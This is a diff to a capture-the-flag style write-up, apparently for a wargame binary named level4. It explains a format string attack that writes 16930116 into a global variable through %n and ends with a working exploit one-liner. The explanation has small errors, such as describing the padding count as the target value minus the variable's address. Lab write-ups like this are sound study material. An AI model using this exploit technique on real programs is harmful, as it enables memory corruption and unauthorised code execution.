@@ -9,7 +9,7 @@ abcd
 abcd
 ```
 
-> Note the *level4* binary read user input from stdin like the *level3*, *level2* and *level1*.
+> Note the *level4* binary reads the user input from stdin like the *level3*, *level2* and *level1*.
 
 ```gdb
 disass main
@@ -61,7 +61,7 @@ The *n* function is exactly like the *v* function of the previous binary level *
 - The global variable *m* have has a different address: __0x8049810__.
 - The global variable *m* is compared to __16930116__ to access to the *system* call instead of __64__.
 
-Check the *p* function called from the main:
+Check the *p* function:
 
 ```gdb
 disass p
@@ -111,7 +111,7 @@ To write in the the global variable *m*:
 - Put the address of the global variable *m* at the beginning of the user input (reversed because the stack is readed in the opposite way = \x10\x98\x04\x08) for the *fgets* call.
 - Add 16930112 (16930116 minus the global variable *m* address) padding characters/bytes using the *%d* format specifier.
 - Add the *%n* special format specifier to put the value 16930116 (the four bytes of the global variable *m* plus the 16930112 paddings bytes).
-- Use the *%4$...* permutation option on the *%n* special format specifier for write its value (16930116) in the twelfth parameter of printf which is the start of the user input buffer (starting by the address of the global variable *m* thanks to the step one).
+- Use the *%12$...* permutation option on the *%n* special format specifier for write its value (16930116) in the twelfth parameter of printf which is the start of the user input buffer (starting by the address of the global variable *m* thanks to the step one).
 
 ```bash
 echo -e "\x10\x98\x04\x08%16930112d%12\$n" | ./level4
